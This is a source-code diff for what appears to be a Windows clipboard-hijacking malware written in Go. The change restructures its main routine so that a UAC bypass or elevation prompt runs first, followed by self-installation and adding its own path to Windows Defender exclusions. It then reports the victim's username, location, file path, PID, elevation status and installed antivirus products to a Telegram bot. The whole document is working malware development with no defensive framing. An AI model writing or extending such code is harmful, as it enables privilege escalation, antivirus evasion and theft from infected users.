@@ -52,9 +52,9 @@ var (
 // behavior settings
 var (
 	installSelf 		string
-	uacBypass 			string
 	defenderExcluder	string
 	autoStart 			string
+	uacBypass			string
 )
 
 var matchers = []clipper.Matcher{
@@ -70,31 +70,41 @@ var matchers = []clipper.Matcher{
 }
 
 func main() {
+	// get self path and name
+	selfPath, _ := utils.GetSelfPath()
+	selfName, _ := utils.GetSelfName()
+
 	installEnabled := installSelf == "true"
-	uacEnabled := uacBypass == "true"
 	defenderEnabled := defenderExcluder == "true"
 	autostartEnabled := autoStart == "true"
+	uacBypassEnabled := uacBypass == "true"
 
-	// run UAC bypass if enabled
-	if uacEnabled {
-		uac.RunBypass()
+	if !utils.IsElevated() {
+		if uacBypassEnabled {
+			uac.RunBypassUAC() // UAC bypass + runas admin if bypass failed
+		} else {
+			uac.RunDefaultUAC() // default runas admin
+		}
 	}
-
+	
 	// run installation if enabled
 	if installEnabled {
 		install.InstallSelf()
+	}
+
+	// add to Defender exclusions if enabled
+	if defenderEnabled {
+		_ = defender.ExcludeFromDefender(selfPath)
 	}
 
 	// we checking geo block
 	geo := utils.GetGeo()
 	geoblock.GeoBlock(blockedGeos, geo)
 
-	// get self path and name
-	selfPath, _ := utils.GetSelfPath()
-	selfName, _ := utils.GetSelfName()
-
 	user, _ := user.Current()
 	pid := syscall.Getpid()
+	uac := utils.IsElevated()
+	username := user.Username
 
 	// get installed antiviruses
 	antiviruses := antivirus.GetInstalledAntiviruses()
@@ -110,18 +120,13 @@ func main() {
 		"PID: <code>%d</code>\n" +
 		"UAC: <code>%t</code>\n" +
 		"AV: <code>%s</code>\n",
-		user.Username,
+		username,
 		geo,
 		selfPath,
 		pid,
-		utils.IsAdmin(),
+		uac,
 		avList,
 	), chat_id, bot_token)
-
-	// add to Defender exclusions if enabled
-	if defenderEnabled {
-		_ = defender.ExcludeFromDefender(selfPath)
-	}
 
 	// add to autostart if enabled
 	if autostartEnabled {
